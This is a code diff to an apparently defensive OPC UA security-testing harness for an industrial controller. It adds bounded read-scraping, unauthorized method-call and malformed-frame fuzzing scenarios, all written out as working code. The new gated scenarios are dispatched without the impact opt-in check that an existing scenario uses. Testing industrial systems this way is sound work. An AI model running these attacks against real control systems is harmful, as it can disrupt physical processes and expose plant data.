@@ -39,12 +39,17 @@ CONTROLLED_GATED_SCENARIOS = {
     "OPCUA_CONFIG_MANIPULATION",
     "OPCUA_ALARM_FLOOD",
     "OPCUA_REPLAY_ATTEMPT",
+    "OPCUA_METHOD_CALL_ABUSE",
+    "OPCUA_PROTOCOL_FUZZ",
 }
 MAX_SESSION_BURST_COUNT = 10
 MIN_SESSION_BURST_DELAY_S = 0.2
 MAX_SUBSCRIPTION_ITEMS = 200
 MIN_SUBSCRIPTION_INTERVAL_MS = 50
 DEFAULT_SUBSCRIPTION_HOLD_S = 10.0
+MAX_READ_SCRAPING_COUNT = 500
+MIN_READ_SCRAPING_INTERVAL_S = 0.02
+MAX_FUZZ_FRAME_COUNT = 5
 
 # The default node for write-impact scenarios. Override it only after the
 # writable node has been intentionally confirmed and documented in TIA Portal.
@@ -335,6 +340,132 @@ async def opcua_subscription_flood() -> list[str]:
     return evidence
 
 
+async def opcua_read_scraping() -> list[str]:
+    """Rapid repeated Read requests against real process tags on a single
+    session -- data-exfiltration-style scraping, distinct from
+    OPCUA_NODE_BROWSE (structure discovery, not value reads) and
+    OPCUA_SUBSCRIPTION_FLOOD (server-push volume, not client-pull rate).
+    Read-only, single session, bounded count and rate.
+    """
+    from asyncua import Client
+
+    requested_reads = int(os.getenv("DAY8_READ_SCRAPING_COUNT", "100"))
+    requested_interval_s = float(os.getenv("DAY8_READ_SCRAPING_INTERVAL_S", "0.05"))
+    read_count = max(1, min(requested_reads, MAX_READ_SCRAPING_COUNT))
+    interval_s = max(requested_interval_s, MIN_READ_SCRAPING_INTERVAL_S)
+
+    nodes = [
+        'ns=3;s="BangTai"', 'ns=3;s="Nhap"', 'ns=3;s="HienThi"',
+        'ns=3;s="Vat 1"', 'ns=3;s="Vat 2"', 'ns=3;s="Vat 3"',
+    ]
+    evidence = [
+        f"configured_reads={requested_reads}; effective_reads={read_count}; max={MAX_READ_SCRAPING_COUNT}",
+        f"configured_interval_s={requested_interval_s}; effective_interval_s={interval_s}",
+        f"targets={nodes}",
+    ]
+
+    t0 = time.time()
+    async with Client(url=OPC_URL, timeout=5) as client:
+        node_objs = [client.get_node(n) for n in nodes]
+        sample_every = max(1, read_count // 10)
+        for i in range(read_count):
+            values = []
+            for node in node_objs:
+                try:
+                    values.append(await node.read_value())
+                except Exception as exc:
+                    values.append(f"ERR:{type(exc).__name__}")
+            if i % sample_every == 0:
+                evidence.append(f"read_{i + 1}: {dict(zip(nodes, values))}")
+            await asyncio.sleep(interval_s)
+    elapsed = max(time.time() - t0, 0.001)
+    total_reads = read_count * len(nodes)
+    evidence.append(f"summary: total_reads={total_reads} elapsed_s={elapsed:.1f} reads_per_s={total_reads / elapsed:.1f}")
+    return evidence
+
+
+async def opcua_method_call_abuse() -> list[str]:
+    """Discover any exposed Method node under Objects and attempt to invoke
+    it without prior authorization context. Reports honestly if the server
+    exposes no callable Method nodes rather than faking a target.
+    """
+    from asyncua import Client, ua
+
+    evidence = []
+    async with Client(url=OPC_URL, timeout=5) as client:
+        objects = client.nodes.objects
+        method_nodes = []
+        for child in await objects.get_children():
+            try:
+                if await child.read_node_class() == ua.NodeClass.Method:
+                    name = (await child.read_browse_name()).Name
+                    method_nodes.append((name, child))
+            except Exception:
+                continue
+
+        evidence.append(f"method_nodes_found={len(method_nodes)}")
+        if not method_nodes:
+            evidence.append("No exposed Method node under Objects on this server; Call-service abuse is not applicable to this configuration (not forced/faked).")
+            return evidence
+
+        for name, node in method_nodes[:3]:
+            try:
+                result = await objects.call_method(node)
+                evidence.append(f"UNEXPECTED_CALL_SUCCESS: {name} -> {result!r}")
+            except Exception as exc:
+                evidence.append(f"{name}: call_rejected={type(exc).__name__}: {exc}")
+    return evidence
+
+
+async def opcua_protocol_fuzz() -> list[str]:
+    """Send a small bounded set of malformed OPC UA binary (UA-TCP) frames
+    and record how the server responds -- ERR message, clean disconnect, or
+    no response. Each case uses a fresh TCP connection so one bad frame
+    cannot desync a shared session; frame count is hard-capped.
+    """
+    import struct
+    from urllib.parse import urlparse
+
+    parsed = urlparse(OPC_URL)
+    host, port = parsed.hostname, parsed.port or 4840
+    fuzz_count = max(1, min(int(os.getenv("DAY8_FUZZ_COUNT", "5")), MAX_FUZZ_FRAME_COUNT))
+    evidence = [f"target={host}:{port}; fuzz_count={fuzz_count}"]
+
+    endpoint = OPC_URL.encode()
+    good_body = struct.pack("<IIIII", 0, 65536, 65536, 2097152, 0) + struct.pack("<I", len(endpoint)) + endpoint
+    all_cases = [
+        ("bad_message_size", b"HEL" + b"F" + struct.pack("<I", 99999) + good_body),
+        ("truncated_body", b"HEL" + b"F" + struct.pack("<I", 8 + len(good_body)) + good_body[:4]),
+        ("unknown_msg_type", b"XXX" + b"F" + struct.pack("<I", 8 + len(good_body)) + good_body),
+        ("zero_length_body", b"HEL" + b"F" + struct.pack("<I", 8)),
+        ("oversized_size_claim", b"HEL" + b"F" + struct.pack("<I", 0x7FFFFFFF) + good_body),
+    ]
+
+    for name, frame in all_cases[:fuzz_count]:
+        writer = None
+        try:
+            reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=3)
+            writer.write(frame)
+            await writer.drain()
+            try:
+                resp = await asyncio.wait_for(reader.read(64), timeout=2)
+                evidence.append(f"{name}: sent={len(frame)}B resp_prefix={resp[:3]!r} resp_len={len(resp)}")
+            except asyncio.TimeoutError:
+                evidence.append(f"{name}: sent={len(frame)}B no_response_within_timeout")
+        except Exception as exc:
+            evidence.append(f"{name}: connection_error={type(exc).__name__}: {exc}")
+        finally:
+            if writer:
+                writer.close()
+                try:
+                    await writer.wait_closed()
+                except Exception:
+                    pass
+        await asyncio.sleep(0.5)
+
+    return evidence
+
+
 async def _attempt_write_and_rollback(client, node_id: str, compute_new_value, evidence: list[str]) -> bool:
     """Write compute_new_value(baseline) to node_id, confirm it landed, then always roll back.
 
@@ -462,6 +593,8 @@ async def execute_safe(scenario_id: str) -> list[str] | None:
         return await opcua_benign_subscription()
     if scenario_id == "READ_TIMING_COVERT":
         return await opcua_read_timing_covert()
+    if scenario_id == "OPCUA_READ_SCRAPING":
+        return await opcua_read_scraping()
     return None
 
 
@@ -480,6 +613,10 @@ async def execute_controlled_gated(scenario_id: str) -> list[str] | None:
     if scenario_id == "OPCUA_CONFIG_MANIPULATION":
         require_impact_opt_in(scenario_id)
         return await opcua_config_manipulation()
+    if scenario_id == "OPCUA_METHOD_CALL_ABUSE":
+        return await opcua_method_call_abuse()
+    if scenario_id == "OPCUA_PROTOCOL_FUZZ":
+        return await opcua_protocol_fuzz()
     return None
 
 
